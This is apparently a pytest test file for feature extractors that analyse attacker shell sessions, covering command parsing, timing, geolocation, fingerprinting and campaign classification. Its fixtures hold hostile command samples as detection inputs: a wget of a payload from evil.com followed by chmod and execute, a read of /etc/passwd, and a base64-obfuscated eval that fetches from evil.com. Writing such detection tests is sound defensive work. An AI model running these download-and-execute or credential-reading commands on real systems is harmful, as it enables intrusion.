import pytest
import numpy as np
from datetime import datetime, timedelta

from features.ast_parser import CommandASTParser
from features.temporal_features import TemporalFeatureExtractor
from features.geolocation import IPGeolocationEnricher
from features.fingerprint import FingerprintGenerator
from features.ngram_features import NGramFeatureExtractor


class TestCommandASTParser:
    """Tests for CommandASTParser."""

    @pytest.fixture
    def parser(self):
        return CommandASTParser()

    def test_parse_simple_command(self, parser):
        result = parser.parse("wget http://evil.com/payload.sh")

        assert result["base_command"] == "wget"
        assert result["category"] == "download"
        assert result["token_count"] == 2
        assert result["has_arguments"] == True
        assert "http://evil.com/payload.sh" in result["urls"]

    def test_parse_complex_command(self, parser):
        result = parser.parse("cat /etc/passwd | grep root > /tmp/output.txt")

        assert result["base_command"] == "cat"
        assert result["has_pipe"] == True
        assert result["has_redirect"] == True
        assert "/etc/passwd" in result["paths"]
        assert "/tmp/output.txt" in result["paths"]

    def test_parse_obfuscation(self, parser):
        result = parser.parse("eval $(base64 -d <<< 'd2dldCBldmlsLmNvbQ==')")

        assert result["has_obfuscation"] == True
        assert "base64" in result["tokens"]

    def test_parse_empty(self, parser):
        result = parser.parse("")

        assert result["base_command"] == ""
        assert result["token_count"] == 0

    def test_parse_session(self, parser):
        commands = ["wget http://evil.com", "chmod +x payload.sh", "./payload.sh"]
        result = parser.parse_session(commands)

        assert result["total_commands"] == 3
        assert result["unique_commands"] == 3
        assert result["has_download"] == True
        assert result["category_sequence"] == "download|privilege|execute"
        assert "download" in result["category_counts"]

    def test_categorize(self, parser):
        assert parser._categorize("wget") == "download"
        assert parser._categorize("ls") == "recon"
        assert parser._categorize("crontab") == "persist"
        assert parser._categorize("unknown_cmd") == "other"

    def test_tokenize(self, parser):
        tokens = parser._tokenize('echo "hello world" > file.txt')

        assert "echo" in tokens
        assert "hello world" in tokens  # Preserved quoted string
        assert ">" in tokens
        assert "file.txt" in tokens


class TestTemporalFeatureExtractor:
    """Tests for TemporalFeatureExtractor."""

    @pytest.fixture
    def extractor(self):
        return TemporalFeatureExtractor(idle_threshold=5.0)

    @pytest.fixture
    def sample_session(self):
        base_time = datetime(2025, 1, 15, 8, 0, 0)
        return {
            "events": [
                {"timestamp": base_time, "input": "wget"},
                {"timestamp": base_time + timedelta(seconds=2), "input": "chmod"},
                {"timestamp": base_time + timedelta(seconds=3), "input": "execute"},
                {"timestamp": base_time + timedelta(seconds=10), "input": "exit"},
            ]
        }

    def test_extract_features(self, extractor, sample_session):
        features = extractor.extract(sample_session)

        assert features["session_duration"] == 10.0
        assert features["command_count"] == 4  # Note: this is computed from events
        assert features["mean_delta"] > 0
        assert features["burst_rate"] > 0
        assert features["idle_period_count"] == 1  # 7s gap between 3s and 10s

    def test_empty_session(self, extractor):
        features = extractor.extract({"events": []})

        assert features["session_duration"] == 0.0
        assert features["mean_delta"] == 0.0

    def test_single_event(self, extractor):
        session = {
            "events": [
                {"timestamp": datetime(2025, 1, 15, 8, 0, 0), "input": "ls"}
            ]
        }
        features = extractor.extract(session)

        assert features["session_duration"] == 0.0

    def test_batch_extract(self, extractor):
        sessions = [
            {"events": [
                {"timestamp": datetime(2025, 1, 15, 8, 0, 0), "input": "a"},
                {"timestamp": datetime(2025, 1, 15, 8, 0, 2), "input": "b"},
            ]},
            {"events": [
                {"timestamp": datetime(2025, 1, 15, 9, 0, 0), "input": "c"},
                {"timestamp": datetime(2025, 1, 15, 9, 0, 5), "input": "d"},
            ]},
        ]
        features = extractor.extract_batch(sessions)

        assert len(features) == 2
        assert features[0]["session_duration"] == 2.0
        assert features[1]["session_duration"] == 5.0


class TestIPGeolocationEnricher:
    """Tests for IPGeolocationEnricher."""

    @pytest.fixture
    def enricher(self):
        return IPGeolocationEnricher(db_path=None)  # No DB for unit tests

    def test_enrich_no_db(self, enricher):
        session = {"src_ip": "8.8.8.8"}
        features = enricher.enrich(session)

        assert features["country_code"] == "UNKNOWN"
        assert features["is_datacenter"] == 0

    def test_enrich_invalid_ip(self, enricher):
        session = {"src_ip": "0.0.0.0"}
        features = enricher.enrich(session)

        assert features["country_code"] == "UNKNOWN"

    def test_enrich_datacenter_ip(self, enricher):
        # Google DNS IP - should be flagged as datacenter if we had DB
        session = {"src_ip": "8.8.8.8"}
        features = enricher.enrich(session)

        # Without DB, we can't detect, but structure is correct
        assert "is_datacenter" in features
        assert "is_tor" in features


class TestFingerprintGenerator:
    """Tests for FingerprintGenerator."""

    @pytest.fixture
    def generator(self):
        return FingerprintGenerator(include_temporal=True, include_count=True)

    @pytest.fixture
    def sample_sessions(self):
        return [
            {
                "session_id": "s1",
                "src_ip": "192.168.1.1",
                "commands": ["wget http://evil.com", "chmod +x payload", "./payload"],
                "session_duration": 45.0,
                "start_time": datetime(2025, 1, 15, 8, 0, 0)
            },
            {
                "session_id": "s2",
                "src_ip": "192.168.1.2",
                "commands": ["wget http://evil.com", "chmod +x payload", "./payload"],
                "session_duration": 50.0,
                "start_time": datetime(2025, 1, 15, 9, 0, 0)
            },
            {
                "session_id": "s3",
                "src_ip": "10.0.0.1",
                "commands": ["ls", "pwd"],
                "session_duration": 5.0,
                "start_time": datetime(2025, 1, 15, 10, 0, 0)
            },
        ]

    def test_generate_fingerprint(self, generator, sample_sessions):
        result = generator.generate(sample_sessions)

        assert all("behavior_fingerprint" in s for s in result)
        assert len(result[0]["behavior_fingerprint"]) == 64  # SHA-256 hex length

    def test_fingerprint_consistency(self, generator, sample_sessions):
        result = generator.generate(sample_sessions)

        # s1 and s2 have same commands, should have same fingerprint (different duration though)
        # With temporal included, they differ
        fp1 = result[0]["behavior_fingerprint"]
        fp2 = result[1]["behavior_fingerprint"]
        fp3 = result[2]["behavior_fingerprint"]

        assert fp1 != fp3
        assert fp2 != fp3

    def test_correlate_campaigns(self, generator, sample_sessions):
        fingerprinted = generator.generate(sample_sessions)
        campaigns = generator.correlate_campaigns(fingerprinted, min_ips=2)

        # s1 and s2 have similar patterns but different durations
        # With temporal included, they might not correlate
        assert isinstance(campaigns, dict)

    def test_classify_campaign(self, generator):
        assert generator._classify_campaign(["wget", "chmod", "xmrig"]) == "CRYPTOMINER"
        assert generator._classify_campaign(["wget", "chmod", "execute"]) == "PAYLOAD_DEPLOYMENT"
        assert generator._classify_campaign(["nmap", "masscan"]) == "RECONNAISSANCE"


class TestNGramFeatureExtractor:
    """Tests for NGramFeatureExtractor."""

    @pytest.fixture
    def extractor(self):
        return NGramFeatureExtractor(n_range=(1, 2), top_k=10)

    @pytest.fixture
    def sample_sessions(self):
        return [
            {"commands": ["wget http://a.com", "chmod +x a", "./a"]},
            {"commands": ["wget http://b.com", "chmod +x b", "./b"]},
            {"commands": ["ls", "pwd", "whoami"]},
        ]

    def test_fit(self, extractor, sample_sessions):
        extractor.fit(sample_sessions)

        assert extractor.is_fitted
        assert len(extractor.vocabulary) > 0
        assert len(extractor.vocabulary) <= 10

    def test_transform(self, extractor, sample_sessions):
        extractor.fit(sample_sessions)
        features = extractor.transform(sample_sessions)

        assert features.shape[0] == 3
        assert features.shape[1] == len(extractor.vocabulary)
        assert np.all(features >= 0)  # Count features should be non-negative

    def test_fit_transform(self, extractor, sample_sessions):
        features = extractor.fit_transform(sample_sessions)

        assert features.shape[0] == 3
        assert extractor.is_fitted

    def test_get_feature_names(self, extractor, sample_sessions):
        extractor.fit(sample_sessions)
        names = extractor.get_feature_names()

        assert len(names) == len(extractor.vocabulary)
        assert all(isinstance(name, str) for name in names)

    def test_not_fitted_error(self, extractor, sample_sessions):
        with pytest.raises(RuntimeError, match="must be fitted"):
            extractor.transform(sample_sessions)
